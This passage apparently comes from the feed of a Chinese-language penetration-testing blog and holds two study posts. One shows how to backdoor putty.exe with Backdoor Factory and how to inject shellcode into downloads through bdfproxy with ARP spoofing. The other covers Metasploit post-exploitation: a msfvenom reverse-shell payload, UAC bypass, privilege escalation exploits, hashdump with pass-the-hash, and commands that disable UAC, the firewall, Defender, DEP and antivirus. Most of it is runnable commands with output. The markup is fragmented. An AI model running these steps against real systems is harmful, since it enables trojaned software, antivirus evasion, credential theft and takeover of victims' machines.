payload<ul><li>backdoor-factory -f putty.exe -s show</li><li>backdoor-factory -f <code>which nc</code> -s show</li><li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li><li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li><li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li></ul></li><li>查看 cave 大小<ul><li>ackdoor-factory -f putty.exe -c -l</li></ul></li></ul></li><li>免杀效果对比<ul><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li></ul></li><li>与 veil-evasion 集成</li><li>Linux：backdoor-factory -f putty.exe -s show</li><li>IAT：import address table</li><li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li></ul><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>-S：检查二进制文件是否支持代码注入</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe –S</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure><ul><li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure><ul><li><p>注入 putty.exe，报错</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li><p>显示未找到文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure></li><li><p>修复错误（备份并重命名）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure></li><li><p>使用 msf 侦听</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure></li><li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p></li><li><p>免杀效果比较</p><p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty3.exe</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty4.exe –J</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty5.exe -a</span><br></pre></td></tr></table></figure><ul><li><p>与 veil-evasion 集成</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil-evasion</span><br><span class="line">[<span class="symbol">menu&gt;&gt;</span>]: <span class="link">list</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>Bdfproxy（mitmproxy）<ul><li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li></ul></li><li>步骤<ul><li>sysctl -w net.ipv4.ip_forward=1</li><li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li><li>vi /etc/bdfproxy/bdfproxy.cfg<ul><li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li></ul></li></ul></li><li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li><li>启动 msf</li><li>流程<ul><li>mana 创建 Fack AP</li><li>badfproxy 代理注入代码</li><li>msf 侦听反弹 shell</li></ul></li></ul><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>修改 IP 转发</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># vim /etc/sysctl.conf </span></span><br><span class="line">net.ipv4.ip_forward=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>修改 iptables</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# vim /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent  </span><br><span class="line">HOST = <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>     #<span class="number">108</span>行，<span class="number">117</span>行，<span class="number">128</span>行，替换所有的，有<span class="number">6</span>个</span><br></pre></td></tr></table></figure></li><li><p>启动 bdfproxy</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># bdfproxy</span></span><br></pre></td></tr></table></figure></li><li><p>启动 msfconsole</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole -r /root/bdfproxy_msf_resource.rc</span></span><br><span class="line">msf exploit(multi/handler) &gt; jobs</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>arp 欺骗</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# arpspoof -i eth0 -t <span class="number">10.10</span><span class="number">.10</span><span class="number">.133</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br></pre></td></tr></table></figure></li><li><p>靶机访问浏览器下载软件，并运行</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/1qLFgFZ.png)</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul><li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p><ul><li>修改无线 SSID 名称</li></ul></li><li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p><ul><li>修改 wlan1 无线网卡适配器并启动</li><li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li></ul></li><li><p>vi /etc/bdfproxy/bdfproxy.cfg</p><ul><li>proxyMode = transparent</li><li>修改侦听 IP 地址并启动 badfproxy</li></ul></li><li><p>启动 msf</p><ul><li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li></ul></li><li><p>补充内容</p><ul><li>全站 HTTPS 防注入（微软每个补丁都带码）</li><li>PE 文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul><li>全部用 0 覆盖</li><li>BDF 默认清除数字签名</li></ul></li></ul></li><li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p><ul><li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li><li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li></ul></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p><ul><li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;a href=&quot;#渗透测试——免杀部分知识&quot; class=&quot;headerlink&quot; title=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;/a&gt;渗透测试——免杀部分知识&lt;/h2&gt;&lt;h4 id=&quot;1-恶意软件&quot;&gt;&lt;a href=&quot;#1-恶意软件&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>msf后渗透部分学习</title>
    <link href="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</id>
    <published>2020-04-28T04:36:04.000Z</published>
    <updated>2020-05-01T08:45:47.813Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul><li><p>已经获得目标系统控制权后扩大战果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>永久后门</li></ul></li><li><p>基于已有 session 扩大战果</p><ul><li><pre><code>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> kali 监听</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set LHOST 10.0.0.128msf exploit(multi/handler) &gt; exploit -j<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>windows 系统执行 payload.exe</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>kali 进入 metepreter</span><br></pre></td></tr></table></figure>msf exploit(multi/handler) &gt; sessions </code></pre></li></ul></li></ul><h1 id="Active-sessions"><a href="#Active-sessions" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p><hr><p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p><p>msf exploit(multi/handler) &gt; sessions </p><h1 id="Active-sessions-1"><a href="#Active-sessions-1" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p><hr><p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p><p>msf exploit(multi/handler) &gt; sessions -i 1<br>[*] Starting interaction with 1…</p><p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">2.</span>获取<span class="keyword">system</span>账号权限</span><br><span class="line"></span><br><span class="line">- 提权失败，一般是由于 UAC 限制</span><br></pre></td></tr></table></figure><p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John<br>meterpreter &gt; load priv<br>[-] The ‘priv’ extension has already been loaded.<br>meterpreter &gt; getsystem<br>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:<br>[-] Named Pipe Impersonation (In Memory/Admin)<br>[-] Named Pipe Impersonation (Dropper/Admin)<br>[-] Token Duplication (In Memory/Admin)</p><p>meterpreter &gt; background</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>绕过 UAC 限制</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ask</span><br></pre></td></tr></table></figure><p>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  set FILENAME win_update.exe<br>  set SESSION 1<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">ai4HMWI.png</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\MXYqrBh.png</span>)</span><br></pre></td></tr></table></figure><br>meterpreter &gt; getsystem<br>meterpreter &gt; getuid</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\uHed9pJ.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/bypassuac<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>show targets<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\eO3yUbv.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac_injection</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/bypassuac_injection<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VwGyhJD.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞直接提权为 system</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ms13<span class="emphasis">_053_</span>schlamperei</span><br></pre></td></tr></table></figure><p>  use exploit/windows/local/ms13_053_schlamperei<br>  set SESSION 1<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![<span class="string">img</span>](<span class="link">https://i.imgur.com/VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_081_</span>track<span class="emphasis">_popup_</span>menu</span><br></pre></td></tr></table></figure><br>use exploit/windows/local/ms13_081_track_popup_menu<br>set SESSION 1<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_097_</span>ie<span class="emphasis">_registry_</span>symlink</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/ms13_097_ie_registry_symlink<br>set SESSION 1<br>set URIPATH /<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>set SRVHOST 10.0.0.128<br>exploit</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/ppr_flatten_rec<br>set SESSION 1<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Jhqu2n4.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>图形化 payload</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set payload windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure><pre><code>use exploit/windows/local/ppr_flatten_recset payload windows/vncinject/reverse_tcpset SESSION 1set LHOST 10.0.0.128set ViewOnly falseexploit<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/wOXJo7u.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭 UAC 功能</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>获取 hashdump</span><br></pre></td></tr></table></figure></code></pre><p>  meterpreter &gt; hashdump<br>      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      John:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>尝试利用</span><br></pre></td></tr></table></figure><br>  use exploit/windows/smb/psexec<br>  set RHOST 10.0.0.132<br>  set SMBUser John<br>  set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/vXDrNNx.png</span>)</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>需要提前关闭 UAC</span><br></pre></td></tr></table></figure><br>sessions -i 2<br>shell<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>shutdown -r -t 0</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/WJBykgA.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>再次利用</span><br></pre></td></tr></table></figure><p>use exploit/windows/smb/psexec<br>set RHOST 10.0.0.132<br>set SMBUser John<br>set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">4.</span>基础操作 </span><br><span class="line"></span><br><span class="line">##### 关闭 防火墙</span><br><span class="line"></span><br><span class="line">- 需要管理员或<span class="keyword">system</span>权限</span><br></pre></td></tr></table></figure><p>netsh advfirewall set allprofiles state on<br>netsh advfirewall set allprofiles state off</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/VsB8p0A.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">##### 关闭windefend</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>查看服务名称</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/SITzUbY.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭防火墙</span><br></pre></td></tr></table></figure><p>  net stop windefend<br>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### bitlocker 加密</span><br><span class="line"></span><br><span class="line">- manage-bde -off C:</span><br><span class="line">- manage-bde -status C:</span><br><span class="line"></span><br><span class="line">##### 关闭DEP</span><br><span class="line"></span><br><span class="line">- bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">##### 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">- run killav</span><br><span class="line">- run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">##### 开启远程桌面服务</span><br></pre></td></tr></table></figure></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>run post/windows/manage/enable_rdp</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span 